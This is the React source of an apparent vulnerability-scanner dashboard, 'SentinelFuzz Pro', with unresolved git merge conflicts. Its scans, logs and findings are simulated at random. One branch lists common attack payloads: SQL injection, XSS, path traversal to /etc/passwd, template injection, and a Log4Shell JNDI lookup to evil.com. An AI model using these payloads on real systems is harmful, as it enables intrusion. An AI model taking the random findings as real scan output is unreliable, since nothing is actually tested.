
import React, { useState, useEffect, useRef, useCallback } from 'react';
import Sidebar from './components/Sidebar';
import TerminalLog from './components/TerminalLog';
import DashboardStats from './components/DashboardStats';
import VulnerabilityList from './components/VulnerabilityList';
import AuthPage from './components/AuthPage';
<<<<<<< HEAD
import Tooltip from './components/Tooltip';
import ChatInterface from './components/ChatInterface';
import { generateRemediationReport, analyzeTargetSurface } from './services/geminiService';
import { db } from './services/database';
import { EngineStatus, LogEntry, ScanConfig, ScanStats, Severity, Vulnerability, User } from './types';
import { Play, Square, Settings2, Search, AlertTriangle, ChevronRight, Download, FileText, ArrowLeft, Shield, History, CheckCircle2, Radar, Bug, Activity, RefreshCw, WifiOff, Info, Loader2 } from 'lucide-react';
import ReactMarkdown from 'react-markdown';
import html2canvas from 'html2canvas';
import { jsPDF } from 'jspdf';
=======
import { generateRemediationReport, analyzeTargetSurface } from './services/geminiService';
import { db } from './services/database';
import { EngineStatus, LogEntry, ScanConfig, ScanStats, Severity, Vulnerability, User } from './types';
import { Play, Square, Settings2, Search, AlertTriangle, ChevronRight, Download, FileText, ArrowLeft, Shield, History, CheckCircle2 } from 'lucide-react';
import ReactMarkdown from 'react-markdown';
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268

const App: React.FC = () => {
  // --- Auth State ---
  const [user, setUser] = useState<User | null>(null);
  const [authLoading, setAuthLoading] = useState(true);

  // --- App State ---
  const [activeTab, setActiveTab] = useState('dashboard');
  const [status, setStatus] = useState<EngineStatus>(EngineStatus.IDLE);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [vulns, setVulns] = useState<Vulnerability[]>([]);
  const [aiReport, setAiReport] = useState<string | null>(null);
  const [aiLoading, setAiLoading] = useState(false);
  const [reportCache, setReportCache] = useState<Record<string, string>>({});
  const [selectedVulnId, setSelectedVulnId] = useState<string | null>(null);
<<<<<<< HEAD
  const [scanProgress, setScanProgress] = useState(0);
  const [currentPhase, setCurrentPhase] = useState<string>('Idle');
  const [isExporting, setIsExporting] = useState(false);
=======
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
  
  const [config, setConfig] = useState<ScanConfig>({
    targetUrl: 'https://example-target.com',
    engines: {
      recon: true,
      fuzzing: true,
      custom: false,
      reporting: true
    },
    aggressionLevel: 'standard'
  });

  const [stats, setStats] = useState<ScanStats>({
    requests: 0,
    duration: 0,
    vulnsFound: 0,
    criticalCount: 0,
    highCount: 0,
    subdomains: 0,
  });

  // --- Refs for Interval Management ---
  const statsIntervalRef = useRef<number | null>(null);
  const logIntervalRef = useRef<number | null>(null);

  // --- Initialization & Auth Check ---
  useEffect(() => {
<<<<<<< HEAD
    db.init();
=======
    // Initialize DB (seed admin if needed)
    db.init();
    
    // Check for active session
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
    const session = db.getSession();
    if (session) {
      setUser(session);
    }
    setAuthLoading(false);
  }, []);

  const handleLoginSuccess = (loggedInUser: User) => {
    setUser(loggedInUser);
  };

  const handleLogout = async () => {
    await db.logout();
    setUser(null);
    setStatus(EngineStatus.IDLE);
    setActiveTab('dashboard');
<<<<<<< HEAD
=======
    // Clear simulation intervals if running
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
    if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
    if (logIntervalRef.current) window.clearInterval(logIntervalRef.current);
  };

  // --- Simulation Logic ---
  const addLog = useCallback((msg: string, type: LogEntry['type'] = 'info', module: string = 'SYSTEM') => {
    setLogs(prev => [...prev, {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString().split('T')[1].split('.')[0],
      message: msg,
      type,
      module
    }]);
  }, []);

  const stopScan = useCallback(() => {
    setStatus(EngineStatus.COMPLETED);
<<<<<<< HEAD
    setScanProgress(100);
    setCurrentPhase('Scan Complete');
    if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
    if (logIntervalRef.current) window.clearInterval(logIntervalRef.current);
    addLog('Scan process terminated.', 'warning', 'CORE');
=======
    if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
    if (logIntervalRef.current) window.clearInterval(logIntervalRef.current);
    addLog('Scan process terminated by user or completion.', 'warning', 'CORE');
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
  }, [addLog]);

  const startScan = useCallback(() => {
    setStatus(EngineStatus.RUNNING);
    setLogs([]);
    setVulns([]);
    setAiReport(null);
    setReportCache({});
    setSelectedVulnId(null);
<<<<<<< HEAD
    setScanProgress(0);
    setCurrentPhase('Initializing');
=======
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
    setStats({ requests: 0, duration: 0, vulnsFound: 0, criticalCount: 0, highCount: 0, subdomains: 0 });
    setActiveTab('scan');

    addLog(`Initializing SentinelFuzz Pro v2.5.0`, 'info', 'CORE');
    addLog(`Target locked: ${config.targetUrl}`, 'info', 'CORE');
    
<<<<<<< HEAD
    // Scan Data Pools
    const subdomainsPool = ['api', 'dev', 'staging', 'auth', 'legacy', 'admin', 'internal', 'vpn', 'mail', 'test'];
    const endpointsPool = ['/login', '/api/v1/user', '/search', '/upload', '/admin/config', '/debug', '/graphql', '/oauth/token'];
    const payloadsPool = [
      "' OR '1'='1", 
      "<script>alert('XSS')</script>", 
      "../../../etc/passwd", 
      "{{7*7}}", 
      "javascript:void(0)", 
      "AND 1=1 UNION SELECT 1,version()",
      "${jndi:ldap://evil.com/a}"
    ];

=======
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
    if (config.engines.recon) {
      addLog('Engine A (Recon) initialized. Enumerating subdomains...', 'info', 'RECON');
    }

<<<<<<< HEAD
    statsIntervalRef.current = window.setInterval(() => {
      setStats(prev => ({
        ...prev,
        requests: prev.requests + Math.floor(Math.random() * 80) + 20,
=======
    // Simulate Stats Ticking
    statsIntervalRef.current = window.setInterval(() => {
      setStats(prev => ({
        ...prev,
        requests: prev.requests + Math.floor(Math.random() * 50) + 10,
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
        duration: prev.duration + 1
      }));
    }, 1000);

<<<<<<< HEAD
    let step = 0;
    const maxSteps = 60; // Increased steps for better simulation
    
    logIntervalRef.current = window.setInterval(() => {
      step++;
      setScanProgress(Math.min(Math.round((step / maxSteps) * 100), 100));

      // RECON PHASE
      if (step < 20) {
          setCurrentPhase('Reconnaissance');
          if (step % 2 === 0) {
              const method = ['DNS_BRUTE', 'CERT_TRANSPARENCY', 'OSINT_LOOKUP'][Math.floor(Math.random() * 3)];
              addLog(`[${method}] Scanning sector ${Math.floor(Math.random() * 999)}...`, 'info', 'RECON');
          }
          if (config.engines.recon && Math.random() > 0.7) {
             const sub = subdomainsPool[Math.floor(Math.random() * subdomainsPool.length)];
             const fullSub = `${sub}.${config.targetUrl.replace('https://', '')}`;
             addLog(`Discovered asset: ${fullSub} (IP: 192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)})`, 'success', 'RECON');
             setStats(prev => ({ ...prev, subdomains: prev.subdomains + 1 }));
          }
      } 
      
      // TRANSITION
      else if (step === 20) {
          addLog('Recon complete. Attack surface mapped. Initializing Engine B (Fuzzing)...', 'info', 'CORE');
      }

      // FUZZING PHASE
      else if (step > 20 && step < 50) {
          setCurrentPhase('Vulnerability Fuzzing');
          
          if (step % 3 === 0) {
              const payload = payloadsPool[Math.floor(Math.random() * payloadsPool.length)];
              const ep = endpointsPool[Math.floor(Math.random() * endpointsPool.length)];
              addLog(`Testing ${ep} with payload: ${payload}`, 'info', 'FUZZ');
          }

          if (config.engines.fuzzing && Math.random() > 0.88) {
              const isCrit = Math.random() > 0.6;
              const ep = endpointsPool[Math.floor(Math.random() * endpointsPool.length)];
              const payload = payloadsPool[Math.floor(Math.random() * payloadsPool.length)];
              
              const newVuln: Vulnerability = {
                id: Math.random().toString(36).substr(2, 9),
                title: isCrit ? (Math.random() > 0.5 ? 'SQL Injection (Union Based)' : 'Remote Code Execution') : (Math.random() > 0.5 ? 'Reflected XSS' : 'IDOR'),
                description: 'Input parameter was reflected without sanitization or executed server-side.',
                severity: isCrit ? Severity.CRITICAL : (Math.random() > 0.5 ? Severity.HIGH : Severity.MEDIUM),
                endpoint: ep,
                payload: payload,
                timestamp: Date.now()
              };
              
              setVulns(prev => [...prev, newVuln]);
              setStats(prev => ({
                ...prev,
                vulnsFound: prev.vulnsFound + 1,
                criticalCount: newVuln.severity === Severity.CRITICAL ? prev.criticalCount + 1 : prev.criticalCount,
                highCount: newVuln.severity === Severity.HIGH ? prev.highCount + 1 : prev.highCount 
              }));
              addLog(`VULNERABILITY CONFIRMED: ${newVuln.title} at ${ep}`, 'error', 'FUZZ');
          }
      }
      
      // REPORTING PHASE
      else if (step >= 50 && step < maxSteps) {
          setCurrentPhase('Analysis & Reporting');
          if (step === 50) addLog('Aggregating results for report...', 'info', 'REPORT');
          if (step === 52) addLog('Calculating CVSS scores...', 'info', 'REPORT');
      }

      // COMPLETION
      if (step >= maxSteps) {
        stopScan();
        addLog('Scan cycle complete. Generating summary report...', 'success', 'REPORT');
        if (config.engines.reporting) {
            analyzeTargetSurface(config.targetUrl, subdomainsPool.slice(0, 3)).then(res => {
=======
    // Simulate Logs and Findings Sequence
    let step = 0;
    const subdomains = ['api', 'dev', 'staging', 'admin-portal', 'legacy'];
    
    logIntervalRef.current = window.setInterval(() => {
      step++;
      
      // RECON PHASE
      if (step < 10 && config.engines.recon) {
        if (Math.random() > 0.6) {
          const sub = subdomains[Math.floor(Math.random() * subdomains.length)];
          addLog(`Discovered subdomain: ${sub}.${config.targetUrl.replace('https://', '')}`, 'success', 'RECON');
          setStats(prev => ({ ...prev, subdomains: prev.subdomains + 1 }));
        }
      }

      // TRANSITION TO FUZZING
      if (step === 12) {
        addLog('Recon complete. Map built. Initializing Engine B (Fuzzing)...', 'info', 'CORE');
      }

      // FUZZING PHASE
      if (step > 15 && step < 40 && config.engines.fuzzing) {
        addLog(`Injecting payloads into param 'q' at /search...`, 'info', 'FUZZ');
        
        // Random Vulnerability Discovery
        if (Math.random() > 0.85) {
          const isCrit = Math.random() > 0.5;
          const newVuln: Vulnerability = {
            id: Math.random().toString(),
            title: isCrit ? 'SQL Injection (Union Based)' : 'Reflected XSS',
            description: 'Input parameter was reflected without sanitization',
            severity: isCrit ? Severity.CRITICAL : Severity.MEDIUM,
            endpoint: isCrit ? '/api/v1/login' : '/search?q=',
            payload: isCrit ? "' OR 1=1 --" : "<script>alert(1)</script>",
            timestamp: Date.now()
          };
          
          setVulns(prev => [...prev, newVuln]);
          setStats(prev => ({
            ...prev,
            vulnsFound: prev.vulnsFound + 1,
            criticalCount: isCrit ? prev.criticalCount + 1 : prev.criticalCount,
            highCount: !isCrit && isCrit ? prev.highCount + 1 : prev.highCount 
          }));
          addLog(`VULNERABILITY DETECTED: ${newVuln.title}`, 'error', 'FUZZ');
        }
      }

      // COMPLETION
      if (step > 45) {
        stopScan();
        addLog('Scan cycle complete. Generating summary report...', 'success', 'REPORT');
        if (config.engines.reporting) {
            // Auto analyze surface if report engine is on
            analyzeTargetSurface(config.targetUrl, subdomains).then(res => {
                // Just logging it for simulation feel, actual report is on demand
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                addLog('Surface analysis complete.', 'info', 'AI-AGENT');
            });
        }
      }

<<<<<<< HEAD
    }, 600);
  }, [config, addLog, stopScan]);


=======
    }, 800);
  }, [config, addLog, stopScan]);


  // Cleanup on unmount
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
  useEffect(() => {
    return () => {
      if (statsIntervalRef.current) window.clearInterval(statsIntervalRef.current);
      if (logIntervalRef.current) window.clearInterval(logIntervalRef.current);
    };
  }, []);

  // --- Handlers ---
  const handleAIAnalysis = async (vuln: Vulnerability) => {
    setActiveTab('reports');
    setSelectedVulnId(vuln.id);
    
    // Check cache first
    if (reportCache[vuln.id]) {
      setAiReport(reportCache[vuln.id]);
      return;
    }

    setAiLoading(true);
    setAiReport(null);
    const report = await generateRemediationReport(vuln);
    setReportCache(prev => ({ ...prev, [vuln.id]: report }));
    setAiReport(report);
    setAiLoading(false);
  };

  const handleBackToReports = () => {
    setSelectedVulnId(null);
    setAiReport(null);
  };

<<<<<<< HEAD
  const handleRetryReport = () => {
      if(selectedVulnId) {
          // Clear cache for this ID to force retry
          const newCache = {...reportCache};
          delete newCache[selectedVulnId];
          setReportCache(newCache);
          
          const vuln = vulns.find(v => v.id === selectedVulnId);
          if(vuln) handleAIAnalysis(vuln);
      }
  };

  const handleDownloadPDF = async () => {
    const reportElement = document.getElementById('report-content');
    if (!reportElement) return;

    setIsExporting(true);
    try {
        const canvas = await html2canvas(reportElement, {
            backgroundColor: '#18181b', // Match surface color
            scale: 2, // Retain quality
        });
        
        const imgData = canvas.toDataURL('image/png');
        const pdf = new jsPDF('p', 'mm', 'a4');
        const pdfWidth = pdf.internal.pageSize.getWidth();
        const pdfHeight = pdf.internal.pageSize.getHeight();
        const imgWidth = canvas.width;
        const imgHeight = canvas.height;
        const ratio = Math.min(pdfWidth / imgWidth, pdfHeight / imgHeight);
        
        // Simple fitting for demo purposes - fits one page or creates long page if needed, 
        // but A4 standard approach: fit width, calculate height
        const imgProps = pdf.getImageProperties(imgData);
        const pdfImgHeight = (imgProps.height * pdfWidth) / imgProps.width;
        
        pdf.addImage(imgData, 'PNG', 0, 0, pdfWidth, pdfImgHeight);
        pdf.save(`SentinelFuzz-Report-${selectedVulnId}.pdf`);
    } catch (err) {
        console.error("PDF Export failed", err);
    } finally {
        setIsExporting(false);
    }
  };

  const generatedReports = vulns.filter(v => reportCache[v.id]);
  const pendingReports = vulns.filter(v => !reportCache[v.id]);
  
  // Check if current report is offline
  const isOfflineReport = aiReport?.includes("(Offline Mode)");

  // --- Constants for Tooltips ---
  const engineDescriptions: Record<string, string> = {
    recon: "Phase 1: Passive/Active asset discovery and mapping.",
    fuzzing: "Phase 2: Payload injection to detect vulnerabilities.",
    custom: "Phase 3: User-defined wordlists and scripts.",
    reporting: "Phase 4: AI-driven analysis and documentation."
  };

  const aggressionDescriptions: Record<string, string> = {
    stealth: "Low traffic. Best for evasion.",
    standard: "Balanced speed and depth.",
    aggressive: "High speed. High risk of detection."
  };
=======
  const generatedReports = vulns.filter(v => reportCache[v.id]);
  const pendingReports = vulns.filter(v => !reportCache[v.id]);
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268

  if (authLoading) {
    return (
      <div className="h-screen w-screen bg-background flex items-center justify-center">
        <div className="w-10 h-10 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  if (!user) {
    return <AuthPage onLoginSuccess={handleLoginSuccess} />;
  }

  return (
    <div className="flex h-screen bg-background text-text font-sans selection:bg-primary/30">
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} onLogout={handleLogout} />
      
      <main className="flex-1 lg:ml-64 p-6 overflow-y-auto relative">
        {/* Header Bar */}
        <header className="flex flex-col md:flex-row md:items-center justify-between mb-8 gap-4">
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
              {activeTab === 'dashboard' && 'Mission Control'}
              {activeTab === 'scan' && 'Live Operations'}
              {activeTab === 'vulns' && 'Vulnerability Matrix'}
              {activeTab === 'reports' && 'Intelligence Reports'}
<<<<<<< HEAD
              {activeTab === 'assistant' && 'SentinelBot Assistant'}
=======
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
              {activeTab === 'config' && 'System Configuration'}
            </h1>
            <p className="text-sm text-zinc-500 mt-1 flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
              Operator: <span className="text-white font-mono">{user.name}</span> 
              <span className="text-zinc-600">|</span> 
              ID: {user.id.split('_')[1]}
            </p>
          </div>
          
          <div className="flex items-center gap-3 bg-surface p-2 rounded-lg border border-zinc-800">
             <div className="relative">
               <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
               <input 
                 type="text" 
                 value={config.targetUrl}
                 onChange={(e) => setConfig({...config, targetUrl: e.target.value})}
                 disabled={status === EngineStatus.RUNNING}
                 className="bg-black/30 border-none rounded pl-9 pr-4 py-2 text-sm w-64 focus:ring-1 focus:ring-primary outline-none"
                 placeholder="Enter Target URL"
               />
             </div>
             {status === EngineStatus.RUNNING ? (
               <button onClick={stopScan} className="p-2 bg-red-500/10 hover:bg-red-500/20 text-red-500 rounded border border-red-500/20 transition-colors">
                 <Square className="w-5 h-5 fill-current" />
               </button>
             ) : (
               <button onClick={startScan} className="flex items-center gap-2 px-4 py-2 bg-primary hover:bg-emerald-400 text-black font-bold rounded transition-all shadow-[0_0_15px_rgba(16,185,129,0.3)] hover:shadow-[0_0_25px_rgba(16,185,129,0.5)]">
                 <Play className="w-4 h-4 fill-current" />
                 START SCAN
               </button>
             )}
          </div>
        </header>

        {/* Content Area */}
        <div className="min-h-[calc(100vh-200px)]">
          
          {activeTab === 'dashboard' && (
            <DashboardStats stats={stats} />
          )}

          {activeTab === 'scan' && (
             <div className="h-[70vh] grid grid-cols-1 lg:grid-cols-3 gap-6">
               <div className="lg:col-span-2 h-full">
                 <TerminalLog logs={logs} />
               </div>
               <div className="space-y-6 h-full overflow-y-auto">
<<<<<<< HEAD
                 
                 {/* Enhanced Progress Visualization */}
                 <div className="bg-surface p-5 rounded-xl border border-zinc-800 shadow-lg relative overflow-hidden">
                   {/* Background Glow */}
                   <div className="absolute top-0 right-0 w-32 h-32 bg-primary/5 blur-[50px] rounded-full -z-0 pointer-events-none"></div>

                   <h3 className="text-sm font-bold text-zinc-400 uppercase tracking-wider mb-6 flex items-center gap-2 relative z-10">
                     <Activity className="w-4 h-4 text-primary" /> 
                     Live Execution Status
                   </h3>

                   {/* Phase Stepper */}
                   <div className="flex items-center justify-between mb-8 relative px-2 z-10">
                     {/* Background Line */}
                     <div className="absolute left-0 top-1/2 -translate-y-1/2 w-full h-0.5 bg-zinc-800 -z-10"></div>
                     
                     {/* Step 1: Recon */}
                     <div className={`relative flex flex-col items-center gap-2 transition-all duration-300 ${['Reconnaissance', 'Vulnerability Fuzzing', 'Analysis & Reporting', 'Scan Complete'].includes(currentPhase) && status !== EngineStatus.IDLE ? 'opacity-100' : 'opacity-40'}`}>
                         <Tooltip content="Phase 1: Discovery of subdomains and assets" position="top">
                           <div className={`w-8 h-8 rounded-full flex items-center justify-center border-2 transition-colors duration-300 ${currentPhase === 'Reconnaissance' ? 'bg-primary border-primary text-black shadow-[0_0_15px_rgba(16,185,129,0.5)] scale-110' : (scanProgress > 20 ? 'bg-primary/20 border-primary text-primary' : 'bg-surface border-zinc-700 text-zinc-500')}`}>
                               <Radar className="w-4 h-4" />
                           </div>
                         </Tooltip>
                         <span className="text-[10px] font-bold uppercase tracking-wider bg-surface px-1 text-zinc-400">Recon</span>
                     </div>

                     {/* Step 2: Fuzz */}
                     <div className={`relative flex flex-col items-center gap-2 transition-all duration-300 ${['Vulnerability Fuzzing', 'Analysis & Reporting', 'Scan Complete'].includes(currentPhase) ? 'opacity-100' : 'opacity-40'}`}>
                         <Tooltip content="Phase 2: Injection of payloads to find vulnerabilities" position="top">
                           <div className={`w-8 h-8 rounded-full flex items-center justify-center border-2 transition-colors duration-300 ${currentPhase === 'Vulnerability Fuzzing' ? 'bg-orange-500 border-orange-500 text-black shadow-[0_0_15px_rgba(249,115,22,0.5)] scale-110' : (scanProgress > 80 ? 'bg-orange-500/20 border-orange-500 text-orange-500' : 'bg-surface border-zinc-700 text-zinc-500')}`}>
                               <Bug className="w-4 h-4" />
                           </div>
                         </Tooltip>
                         <span className="text-[10px] font-bold uppercase tracking-wider bg-surface px-1 text-zinc-400">Fuzzing</span>
                     </div>

                      {/* Step 3: Report */}
                     <div className={`relative flex flex-col items-center gap-2 transition-all duration-300 ${['Analysis & Reporting', 'Scan Complete'].includes(currentPhase) ? 'opacity-100' : 'opacity-40'}`}>
                         <Tooltip content="Phase 3: Aggregation of findings and reporting" position="top">
                           <div className={`w-8 h-8 rounded-full flex items-center justify-center border-2 transition-colors duration-300 ${['Analysis & Reporting', 'Scan Complete'].includes(currentPhase) ? 'bg-blue-500 border-blue-500 text-black shadow-[0_0_15px_rgba(59,130,246,0.5)] scale-110' : 'bg-surface border-zinc-700 text-zinc-500'}`}>
                               <FileText className="w-4 h-4" />
                           </div>
                         </Tooltip>
                         <span className="text-[10px] font-bold uppercase tracking-wider bg-surface px-1 text-zinc-400">Report</span>
                     </div>
                   </div>

                   {/* Progress Bar & Status Text */}
                   <div className="mb-6 relative z-10">
                       <div className="flex justify-between items-end mb-2">
                           <div>
                             <div className="text-xs text-zinc-500 mb-1">Current Task</div>
                             <div className="text-white font-mono text-sm animate-pulse">{currentPhase === 'Idle' ? 'Ready to Start' : currentPhase}...</div>
                           </div>
                           <Tooltip content={`${scanProgress}% completed`}>
                             <div className="text-2xl font-bold text-primary font-mono cursor-default">{scanProgress}%</div>
                           </Tooltip>
                       </div>
                       <Tooltip content="Overall mission progress" position="bottom" className="w-full">
                         <div className="w-full bg-zinc-800 h-2 rounded-full overflow-hidden">
                           <div 
                             className="bg-gradient-to-r from-primary/80 to-primary h-full rounded-full transition-all duration-300 ease-out shadow-[0_0_10px_rgba(16,185,129,0.5)]" 
                             style={{width: `${scanProgress}%`}}
                           />
                         </div>
                       </Tooltip>
                   </div>

                   {/* Granular Metrics Grid */}
                   <div className="grid grid-cols-2 gap-3 relative z-10">
                      <div className="bg-zinc-900/50 p-3 rounded-lg border border-zinc-800/50">
                        <div className="text-[10px] text-zinc-500 uppercase mb-1">Total Requests</div>
                        <div className="text-lg font-mono text-white">{stats.requests.toLocaleString()}</div>
                      </div>
                      <div className="bg-zinc-900/50 p-3 rounded-lg border border-zinc-800/50">
                        <div className="text-[10px] text-zinc-500 uppercase mb-1">Elapsed Time</div>
                        <div className="text-lg font-mono text-white">{stats.duration}s</div>
                      </div>
                      <div className="bg-zinc-900/50 p-3 rounded-lg border border-zinc-800/50">
                        <div className="text-[10px] text-zinc-500 uppercase mb-1">Vulns Found</div>
                        <div className={`text-lg font-mono ${stats.vulnsFound > 0 ? 'text-red-500' : 'text-zinc-400'}`}>{stats.vulnsFound}</div>
                      </div>
                      <div className="bg-zinc-900/50 p-3 rounded-lg border border-zinc-800/50">
                        <div className="text-[10px] text-zinc-500 uppercase mb-1">Active Threads</div>
                        <div className="text-lg font-mono text-purple-400">{status === EngineStatus.RUNNING ? '24' : '0'}</div>
                      </div>
                   </div>

                 </div>

                 {/* Engine Status List */}
                 <div className="bg-surface p-4 rounded-xl border border-zinc-800">
                    <h3 className="text-sm font-bold text-zinc-400 uppercase tracking-wider mb-4">Module Status</h3>
                    <div className="space-y-2">
                      {Object.entries(config.engines).map(([key, active]) => (
                        <div key={key} className="flex items-center justify-between p-2 rounded bg-black/20">
                          <span className="capitalize text-sm text-zinc-300">{key} Engine</span>
=======
                 <div className="bg-surface p-4 rounded-xl border border-zinc-800">
                   <h3 className="text-sm font-bold text-zinc-400 uppercase tracking-wider mb-4">Live Metrics</h3>
                   <div className="space-y-4">
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-zinc-500">Status</span>
                        <span className={`text-xs px-2 py-0.5 rounded-full font-bold ${status === EngineStatus.RUNNING ? 'bg-emerald-500/20 text-emerald-500' : 'bg-zinc-700 text-zinc-300'}`}>
                          {status}
                        </span>
                      </div>
                      <div className="flex justify-between items-center">
                         <span className="text-sm text-zinc-500">Duration</span>
                         <span className="font-mono text-white">{stats.duration}s</span>
                      </div>
                      <div className="w-full bg-zinc-800 h-1.5 rounded-full overflow-hidden">
                        <div className="bg-primary h-full rounded-full animate-[pulse_2s_infinite]" style={{width: status === EngineStatus.RUNNING ? '100%' : '0%'}}></div>
                      </div>
                   </div>
                 </div>

                 <div className="bg-surface p-4 rounded-xl border border-zinc-800">
                    <h3 className="text-sm font-bold text-zinc-400 uppercase tracking-wider mb-4">Active Engines</h3>
                    <div className="space-y-2">
                      {Object.entries(config.engines).map(([key, active]) => (
                        <div key={key} className="flex items-center justify-between p-2 rounded bg-black/20">
                          <span className="capitalize text-sm text-zinc-300">{key}</span>
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                          <div className={`w-2 h-2 rounded-full ${active ? (status === EngineStatus.RUNNING ? 'bg-emerald-500 animate-pulse' : 'bg-emerald-500') : 'bg-zinc-700'}`} />
                        </div>
                      ))}
                    </div>
                 </div>
               </div>
             </div>
          )}

          {activeTab === 'vulns' && (
            <VulnerabilityList vulns={vulns} onAnalyze={handleAIAnalysis} />
          )}

          {activeTab === 'reports' && (
            <div className="bg-surface rounded-xl border border-zinc-800 min-h-[600px] flex flex-col">
              
              {/* No vulnerability selected state - Show Selection List */}
              {!selectedVulnId && (
                <div className="p-8">
                  <div className="flex flex-col items-center justify-center text-center mb-8">
                    <FileText className="w-12 h-12 mb-3 text-zinc-600" />
                    <h3 className="text-xl font-semibold text-white">Security Intelligence Center</h3>
                    <p className="text-zinc-500 max-w-md">Select a detected vulnerability below to generate a comprehensive AI-driven remediation report.</p>
                  </div>

                  {vulns.length === 0 ? (
                     <div className="bg-black/20 rounded-lg p-6 text-center border border-dashed border-zinc-800">
                       <Shield className="w-8 h-8 text-zinc-700 mx-auto mb-2" />
                       <p className="text-zinc-500">No vulnerabilities detected to analyze.</p>
                       <button onClick={() => setActiveTab('scan')} className="mt-3 text-primary hover:underline text-sm">
                         Start a scan first
                       </button>
                     </div>
                  ) : (
                    <div className="space-y-10">
                      
                      {/* Generated Reports History */}
                      {generatedReports.length > 0 && (
                        <div className="animate-in fade-in slide-in-from-bottom-2 duration-500">
                          <h4 className="text-emerald-500 text-sm font-bold uppercase tracking-wider mb-4 flex items-center gap-2">
                            <History className="w-4 h-4" /> Generated Reports History
                          </h4>
                          <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
                            {generatedReports.map((vuln) => (
                              <button 
                                key={vuln.id}
                                onClick={() => handleAIAnalysis(vuln)}
                                className="group relative flex flex-col items-start p-5 bg-emerald-900/10 border border-emerald-500/20 rounded-xl hover:bg-emerald-900/20 hover:border-emerald-500/40 transition-all text-left"
                              >
                                <div className="absolute top-4 right-4 text-emerald-500">
                                  <CheckCircle2 className="w-5 h-5" />
                                </div>
                                <h4 className="font-semibold text-emerald-100 mb-1 line-clamp-1 pr-8">{vuln.title}</h4>
                                <code className="text-xs text-emerald-500/70 font-mono mb-3 max-w-full truncate">
                                  {vuln.endpoint}
                                </code>
                                <div className="mt-auto w-full flex items-center justify-between text-xs text-emerald-400">
                                  <span>View Cached Report</span>
                                  <ChevronRight className="w-3 h-3" />
                                </div>
                              </button>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* Pending Analysis */}
                      {pendingReports.length > 0 && (
                        <div className="animate-in fade-in slide-in-from-bottom-4 duration-700">
                          <h4 className="text-zinc-400 text-sm font-bold uppercase tracking-wider mb-4 flex items-center gap-2">
                             <Shield className="w-4 h-4" /> Pending Analysis
                          </h4>
                          <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
                            {pendingReports.map((vuln) => (
                              <button 
                                key={vuln.id}
                                onClick={() => handleAIAnalysis(vuln)}
                                className="group relative flex flex-col items-start p-5 bg-black/20 border border-zinc-800 rounded-xl hover:bg-zinc-800/50 hover:border-primary/30 transition-all text-left"
                              >
                                <div className={`absolute top-4 right-4 px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider rounded border ${
                                  vuln.severity === Severity.CRITICAL ? 'text-red-500 bg-red-500/10 border-red-500/20' : 
                                  vuln.severity === Severity.HIGH ? 'text-orange-500 bg-orange-500/10 border-orange-500/20' :
                                  'text-yellow-500 bg-yellow-500/10 border-yellow-500/20'
                                }`}>
                                  {vuln.severity}
                                </div>
                                
                                <div className="mb-3 p-2 bg-zinc-900 rounded-lg group-hover:bg-zinc-800 transition-colors">
                                  <Shield className={`w-5 h-5 ${
                                    vuln.severity === Severity.CRITICAL ? 'text-red-500' : 'text-orange-400'
                                  }`} />
                                </div>
                                
                                <h4 className="font-semibold text-zinc-200 group-hover:text-white mb-1 line-clamp-1">{vuln.title}</h4>
                                <code className="text-xs text-zinc-500 font-mono bg-black/30 px-1.5 py-0.5 rounded mb-3 max-w-full truncate">
                                  {vuln.endpoint}
                                </code>
                                
                                <div className="mt-auto w-full flex items-center justify-between text-xs text-zinc-600 group-hover:text-primary transition-colors">
                                  <span>Generate Report</span>
                                  <ChevronRight className="w-3 h-3" />
                                </div>
                              </button>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}

              {/* Loading State */}
              {selectedVulnId && aiLoading && (
                <div className="flex-1 flex flex-col items-center justify-center p-8">
                   <div className="w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin mb-6"></div>
                   <h3 className="text-xl font-bold text-white animate-pulse">Analyzing Vector...</h3>
                   <div className="text-zinc-500 mt-2 text-sm flex flex-col items-center gap-1">
                     <span>Querying Gemini 2.5 Flash Security Model</span>
                     <span className="font-mono text-xs opacity-50">Context: {vulns.find(v => v.id === selectedVulnId)?.title}</span>
                   </div>
                </div>
              )}

              {/* Report Display */}
              {selectedVulnId && aiReport && !aiLoading && (
                <div className="flex flex-col h-full animate-in fade-in slide-in-from-bottom-4 duration-500">
                  <div className="p-6 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/30">
                    <div className="flex items-center gap-4">
<<<<<<< HEAD
                      {/* Back Button with Breadcrumbs */}
                      <button 
                        onClick={handleBackToReports}
                        className="flex items-center gap-2 text-sm text-zinc-400 hover:text-white transition-colors px-3 py-2 hover:bg-zinc-800/50 rounded-lg group"
                      >
                        <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
